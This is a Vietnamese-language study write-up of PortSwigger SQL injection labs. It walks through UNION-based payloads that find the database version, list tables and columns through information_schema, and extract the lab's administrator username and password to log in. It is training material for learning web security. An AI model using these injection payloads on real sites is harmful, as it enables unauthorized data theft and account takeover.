# Examining the database in SQL injection attacks

Để khai thác các lỗ hổng SQL injection, cần thu thập thông tin về cơ sở dữ liệu. Điều này bao gồm:

- **Loại và phiên bản** của hệ quản trị cơ sở dữ liệu (DBMS).
- **Các bảng và cột** mà cơ sở dữ liệu chứa.

# Querying the database type and version

Có thể xác định **loại** và **phiên bản** của hệ quản trị cơ sở dữ liệu (DBMS) bằng cách chèn các truy vấn đặc trưng cho từng hệ thống và kiểm tra xem truy vấn nào hoạt động.

Dưới đây là một số truy vấn để xác định phiên bản của một số hệ quản trị cơ sở dữ liệu phổ biến:

| Loại CSDL         | Truy vấn                |
|-------------------|-------------------------|
| Mircrosoft, MySQL | SELECT @@version        |
| Oracle            | SELECT * FROM v$version |
| PostgreSQL        | SELECT version()        |

Ví dụ, có thể sử dụng tấn công **UNION** với payload sau:

    ' UNION SELECT @@version--

Nếu tấn công thành công, nó có thể trả về thông tin như sau, xác nhận rằng cơ sở dữ liệu đang sử dụng **Microsoft SQL Server** và hiển thị phiên bản của nó:

    Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)  
    Mar 18 2018 09:11:49  
    Copyright (c) Microsoft Corporation  
    Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)  

# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image69.png?raw=true)

Truy cập lab: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image70.png?raw=true)

Click chọn category Gifts và intercept request trong Burp Suite: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image71.png?raw=true)

Send request và xem response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image72.png?raw=true)

Thử thêm payload **'UNION+SELECT+NULL,NULL--** vào tham số category: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image73.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image74.png?raw=true)

Bị lỗi dù đã sử dụng giá trị NULL, có thể do cách sử dụng comment không khớp với kiểu CSDL, thử thay **--** thành **+#**: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image75.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image76.png?raw=true)

=> Thành công, tìm ra số lượng cột trong truy vấn gốc là 2. Tiếp theo vì version của DB là kiểu dữ liệu chuỗi, cần thử xem cột nào là cột có kiểu dữ liệu chuỗi. Thay giá trị NULL thứ 2 thành 'abcdf': 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image77.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image78.png?raw=true)

=> Tìm ra cột thứ 2 có kiểu dữ liệu là chuỗi. Thử cả cột thứ nhất: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image79.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image80.png?raw=true)

=> Cột thứ nhất cũng có kiểu dữ liệu là chuỗi. Để truy xuất DB version, thử chèn giá trị **SELECT+@@version**: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image81.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image82.png?raw=true)

=> Thành công tìm ra DB version. Chuyển payload này sang request bên tab proxy và forward: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image83.png?raw=true)

Solved the lab!

![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image84.png?raw=true)


# Listing the contents of the database

Hầu hết các hệ quản trị cơ sở dữ liệu (trừ Oracle) đều có một tập hợp các **view đặc biệt** gọi là **information schema**. Các view này cung cấp thông tin về cấu trúc của cơ sở dữ liệu.

**1. Liệt kê danh sách bảng trong cơ sở dữ liệu**

Có thể truy vấn **information_schema.tables** để lấy danh sách các bảng:

    SELECT * FROM information_schema.tables

Truy vấn này sẽ trả về kết quả như sau:

    TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE  
    =====================================================  
    MyDatabase     dbo           Products    BASE TABLE  
    MyDatabase     dbo           Users       BASE TABLE  
    MyDatabase     dbo           Feedback    BASE TABLE  

Dữ liệu này cho biết cơ sở dữ liệu có **ba bảng**, lần lượt là **Products**, **Users**, và **Feedback**.

**2. Liệt kê danh sách cột trong một bảng cụ thể**

Có thể truy vấn **information_schema.columns** để lấy thông tin về các cột trong một bảng cụ thể. Ví dụ, để liệt kê các cột của bảng **Users**:

    SELECT * FROM information_schema.columns WHERE table_name = 'Users'

Truy vấn này sẽ trả về kết quả như sau:

    TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE  
    =================================================================  
    MyDatabase     dbo           Users       UserId       int  
    MyDatabase     dbo           Users       Username     varchar  
    MyDatabase     dbo           Users       Password     varchar  

Kết quả này cho thấy bảng **Users** chứa **ba cột**:

- UserId (kiểu dữ liệu int)
- Username (kiểu dữ liệu varchar)
- Password (kiểu dữ liệu varchar)

Sử dụng các truy vấn này, kẻ tấn công có thể tìm ra cấu trúc của cơ sở dữ liệu và từ đó lên kế hoạch **truy xuất hoặc thao túng dữ liệu** theo ý muốn.

# Lab: SQL injection attack, listing the database contents on non-Oracle databases

![img](85)

Truy cập lab: 

![img](86)

Chọn category Lifestyle và intercept request trong Burp Suite: 

![img](87)

Thử chèn payload **'+UNION+SELECT+NULL,NULL--** vào tham số category để kiểm tra số lượng cột trong truy vấn gốc: 

![img](88)

Send request, quan sát response: 

![img](89)

=> Thành công biết rằng số lượng cột của truy vấn gốc là 2. 

Thử kiểm tra xem cột nào nhận giá trị kiểu chuỗi: 

![img](90)

Send request, quan sát response: 

![img](91)

=> Cả 2 cột có thể chứa giá trị kiểu chuỗi. 

Chèn payload **'UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--** để lấy ra tên bảng trong CSDL: 

![img](92)

Send request, quan sát response:

![img](93)

=> Tìm ra tên bảng chứa thông tin về users: users_twsmtx

Tiếp theo cần tìm tên các cột trong bảng này, sử dụng payload **'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_twsmtx'--**:

![img](94)

Send request, quan sát response: 

![img](95)

![img](96)

=> Tìm ra cột lưu thông tin username: username_wmowzy và cột lưu thông tin password là: password_tqaahw

Như vậy đã tìm ra tên bảng và tên cột, tiếp theo sử dụng payload **'UNION SELECT username_wmowzy, password_tqaahw FROM users_twsmtx--** để trích xuất thông tin: 

![img](97)

Send request, quan sát response: 

![img](98)

=> username: administrator và password: xqq27g94tizfndzfgd2p

Login tài khoản administrator: 

![img](99)

Solved the lab!

![img](100)









